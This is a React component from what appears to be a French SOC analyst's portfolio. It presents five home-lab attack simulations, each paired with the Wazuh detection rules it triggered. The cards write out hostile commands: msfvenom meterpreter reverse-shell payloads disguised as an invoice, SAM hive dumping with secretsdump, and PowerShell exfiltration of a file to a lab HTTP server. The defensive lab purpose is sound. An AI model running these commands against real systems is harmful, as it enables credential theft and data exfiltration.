import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'

const SEV = {
  critical: { label: 'CRITICAL', bar: 'bg-critical', text: 'text-critical', border: 'border-l-critical' },
  high:     { label: 'HIGH',     bar: 'bg-high',     text: 'text-high',     border: 'border-l-high' },
  medium:   { label: 'MEDIUM',   bar: 'bg-medium',   text: 'text-medium',   border: 'border-l-medium' },
}

const PROJECTS = [
  {
    id: 1,
    title: 'Évasion Antivirus & Détection Wazuh',
    sev: 'high',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1562 — Impair Defenses',
    technique: 'msfvenom + encodage shikata_ga_nai',
    date: '2026-06-10',
    summary: "Payload msfvenom brut encodé 5 fois, livré via HTTP sur Windows Server 2022. Defender bloque à l'écriture. Wazuh déclenche deux règles — la chaîne de détection est complète même sans session établie.",
    steps: [
      'msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest ... (WinServer2022) — Defender bloque',
    ],
    detection: [
      'Rule 62123 niv.12  —  Windows Defender: Malware detected',
      'Rule 62124 niv.3   —  Windows Defender: Threat blocked',
    ],
    lesson: "Un payload brut msfvenom est détecté instantanément par les AV modernes. Sans obfuscation avancée, zéro chance de passer.",
  },
  {
    id: 2,
    title: 'Credential Dumping — SAM / NTLM',
    sev: 'critical',
    rules: ['92026 (niv.14)'],
    mitre: 'T1003.002 — OS Credential Dumping',
    technique: 'reg.exe + Impacket secretsdump',
    date: '2026-06-14',
    summary: "Export des ruches SAM et SYSTEM via reg.exe, exfiltration SMB vers Kali, extraction des hachages NTLM avec secretsdump. Alerte Wazuh niveau 14 — critique maximum.",
    steps: [
      'reg save HKLM\\SAM C:\\Temp\\sam.hive',
      'reg save HKLM\\SYSTEM C:\\Temp\\system.hive',
      'copy .\\sam.hive \\\\kali\\share  (exfil SMB)',
      'secretsdump.py LOCAL -sam sam.hive -system system.hive  (Kali)',
    ],
    detection: [
      'Rule 92026 niv.14  —  reg.exe: SAM hive dump detected  [CRITICAL]',
    ],
    lesson: "reg.exe ciblant SAM est un IoC critique immédiat. Niveau 14 = alerte maximale, déclencherait une réponse aux incidents en production.",
  },
  {
    id: 3,
    title: 'Exfiltration HTTP non chiffrée',
    sev: 'critical',
    rules: ['100010 (niv.12)', '100011 (niv.14)'],
    mitre: 'T1048.003 — Exfiltration Over Unencrypted Protocol',
    technique: 'PowerShell Invoke-WebRequest vers HTTP python3',
    date: '2026-06-15',
    summary: "Données sensibles transmises depuis Windows Server via PowerShell vers un serveur HTTP sur Kali. Deux règles corrélées reconstituent la chaîne complète.",
    steps: [
      'python3 -m http.server 8888  (Kali)',
      'Invoke-WebRequest -Uri http://192.168.56.100:8888 -InFile secret.txt  (WinServer2022)',
    ],
    detection: [
      'Rule 100010 niv.12  —  PowerShell: outbound network connection',
      'Rule 100011 niv.14  —  Network: exfiltration port 8888 non-standard',
    ],
    lesson: "Corréler deux alertes distinctes pour reconstruire le scénario d'attaque — c'est exactement le cœur du métier d'analyste SOC.",
  },
  {
    id: 4,
    title: 'Phishing msfvenom — Chaîne complète',
    sev: 'high',
    rules: ['62123 (niv.12)', '62124 (niv.3)'],
    mitre: 'T1566 — Phishing',
    technique: 'Payload .exe déguisé en facture, livraison HTTP',
    date: '2026-06-18',
    summary: "Simulation phishing bout-en-bout : facture_2026.exe créé, hébergé sur Kali, téléchargé et lancé sur la cible. Defender identifie Trojan:Win32/Zusy.NCD!MTB et bloque.",
    steps: [
      'msfvenom ... -o facture_2026.exe',
      'python3 -m http.server 8080  (Kali)',
      'Invoke-WebRequest + Start-Process facture_2026.exe  (WinServer2022)',
    ],
    detection: [
      'Rule 62123 niv.12  —  Defender: Trojan:Win32/Zusy.NCD!MTB detected',
      'Rule 62124 niv.3   —  Defender: Threat blocked',
    ],
    lesson: "Un payload msfvenom brut déguisé en document est reconnu instantanément. Les attaquants réels combinent packing, obfuscation et living-off-the-land.",
  },
  {
    id: 5,
    title: 'Network Discovery — Détection scan Nmap',
    sev: 'medium',
    rules: ['100012 (niv.10)', '100013 (niv.10)'],
    mitre: 'T1046 — Network Service Discovery',
    technique: 'Capture tshark + analyse signature SYN Nmap',
    date: '2026-07-06',
    summary: "Capture réseau avec tshark pendant un scan Nmap SYN stealth. 2117 paquets TCP SYN capturés. La signature est identifiable en quelques secondes dans le pcap.",
    steps: [
      'tshark -i eth1 -w capture.pcap  (Kali)',
      'nmap -sS -p 1-65535 192.168.56.101  (Kali)',
      'Analyse : SYN sans SYN-ACK → 2117 paquets → pattern scan',
    ],
    detection: [
      'Rule 100012 niv.10  —  Network: Nmap SYN scan detected',
      'Rule 100013 niv.10  —  Network: Port sweep detected',
    ],
    lesson: "Reconnaître un scan Nmap dans une capture réseau (SYN sans SYN-ACK, masse de ports, courte durée) est une compétence fondamentale SOC.",
  },
]

function Card({ p, idx }) {
  const [open, setOpen] = useState(false)
  const s = SEV[p.sev]

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.45, delay: idx * 0.06 }}
      className={`bg-surface border border-divider border-l-4 ${s.border} overflow-hidden`}
    >
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full text-left px-6 py-5 hover:bg-elevated/30 transition-colors duration-150"
        aria-expanded={open}
      >
        <div className="flex items-start gap-4 justify-between">
          <div className="flex-1 min-w-0">
            <div className="flex flex-wrap items-center gap-2.5 mb-3">
              <span className={`text-xs font-semibold uppercase tracking-wider ${s.text}`}>
                {s.label}
              </span>
              <span className="text-zinc-700">·</span>
              <span className="text-xs text-accent font-medium">Détection prouvée ✓</span>
              {p.rules.map(r => (
                <span key={r} className="text-xs text-zinc-600">
                  Rule {r}
                </span>
              ))}
            </div>

            <h3 className="font-display font-bold text-xl sm:text-2xl text-zinc-100 leading-tight mb-2">
              {p.title}
            </h3>

            <p className="text-xs text-zinc-500 uppercase tracking-wide">
              {p.mitre} &nbsp;·&nbsp; {p.technique}
            </p>
          </div>

          <motion.span
            animate={{ rotate: open ? 180 : 0 }}
            transition={{ duration: 0.2 }}
            className="text-zinc-600 text-xl mt-1 flex-shrink-0"
          >
            ↓
          </motion.span>
        </div>

        <p className="text-zinc-400 text-sm mt-3 leading-relaxed text-left">{p.summary}</p>
      </button>

      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            key="detail"
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.25, ease: 'easeInOut' }}
            className="overflow-hidden"
          >
            <div className="px-6 pb-6 pt-5 border-t border-divider space-y-5">
              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Commandes exécutées
                </p>
                <div className="bg-bg border border-divider p-4 space-y-2">
                  {p.steps.map((step, i) => (
                    <p key={i} className="font-mono text-xs text-zinc-300 leading-relaxed">
                      <span className="text-zinc-700 select-none mr-2">{i + 1}.</span>
                      {step}
                    </p>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Alertes déclenchées
                </p>
                <div className="space-y-2">
                  {p.detection.map((d, i) => (
                    <div key={i} className="flex items-start gap-2.5">
                      <span className="text-accent text-sm mt-px">✓</span>
                      <span className="font-mono text-xs text-zinc-200 leading-relaxed">{d}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-widest text-zinc-600 mb-2.5">
                  Leçon SOC
                </p>
                <p className="text-sm text-zinc-400 leading-relaxed border-l-2 border-accent pl-4">
                  {p.lesson}
                </p>
              </div>

              <p className="text-xs text-zinc-700 text-right">{p.date}</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

export default function Projets() {
  return (
    <section id="projets" className="py-24 px-6 max-w-6xl mx-auto">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="mb-12"
      >
        <p className="text-xs font-medium uppercase tracking-[0.2em] text-accent mb-3">
          Projets
        </p>
        <h2 className="font-display font-bold text-4xl sm:text-5xl text-zinc-100 uppercase">
          Lab SOC en action
        </h2>
        <p className="text-zinc-500 mt-3 max-w-xl leading-relaxed">
          Cinq attaques réelles reproduites dans le lab, avec la chaîne de détection Wazuh
          prouvée bout en bout. Cliquer sur une carte pour les détails.
        </p>
      </motion.div>

      <div className="space-y-3">
        {PROJECTS.map((p, i) => <Card key={p.id} p={p} idx={i} />)}
      </div>
    </section>
  )
}
